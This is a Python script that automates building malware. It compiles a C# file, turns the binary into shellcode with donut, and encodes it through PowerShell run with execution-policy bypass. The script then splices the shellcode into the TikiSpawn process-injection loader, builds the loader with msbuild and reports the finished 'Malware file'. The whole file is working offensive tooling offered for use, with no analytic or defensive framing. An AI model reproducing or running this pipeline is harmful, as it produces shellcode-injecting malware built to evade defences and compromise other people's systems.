import subprocess
import sys
import os
import re
import time

if len(sys.argv) < 2:
    print("[!] Provide C# source file")
    sys.exit(1)
else:
    filename = sys.argv[1]

cwd = os.getcwd()

# compile
compile_cmd = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /nologo /out:{}\temp.exe /platform:x64 {}".\
               format(cwd, filename)
ob = subprocess.check_output(compile_cmd)

if len(ob) > 1:
    print("Unexpected csc.exe output:")
    print(ob)
    sys.exit(1)

print("[+] Source compiled!")

# donut
donut_cmd = r"{}\donut_v0.9.3\donut.exe -a 2 -o {}\temp.bin {}\temp.exe".format(cwd,cwd,cwd)
do = subprocess.check_output(donut_cmd)

# encode/compress
ps_cmd = r"""powershell -exec bypass -c "Import-Module {}\Get-CS.ps1;  Get-CS -inFile {}\temp.bin -outFile {}\temp.b64" """.\
    format(cwd, cwd, cwd)

cs = subprocess.Popen(ps_cmd, stderr=subprocess.STDOUT)

time.sleep(1)
print("[+] Shellcode encoded!")

with open(cwd+r"\temp.b64") as f:
    newcs = f.read()

# modify TikiSpawn
f2r = open(cwd+r"\TikiSpawn\Program.cs","r")
tiki_code = f2r.read()
f2r.close()

b64_regex = r"(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})"
new_code = re.sub(r'cesh = @"' + b64_regex, r'cesh = @"' + newcs, tiki_code)

f2w = open(cwd+r"\TikiSpawn\Program.cs","w")
f2w.write(new_code)
f2w.close()
print("[+] Tiki code modyfied!")

# build tikispawn with: msbuild TikiSpawn.csproj
#msb_cmd = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}\..\TikiSpawn\"
commands = r"""
"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\VsDevCmd.bat"
msbuild {}\TikiSpawn\TikiSpawn.csproj
""".format(cwd)
process = subprocess.Popen('cmd /k', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, err = process.communicate(commands.encode('utf-8'))
if err:
    print("[-] Error:")
    print(err.decode())
    sys.exit(1)
else:
    a = re.findall(r"Copying file from [^ ]* to \"C:",out.decode())
    if a:
        print("[+] Malware file: {}".format(a[0].split('"')[1]))

    print("[!] Cleanup.")
    _ = subprocess.Popen(r"del {}\temp*".format(cwd),shell=True)
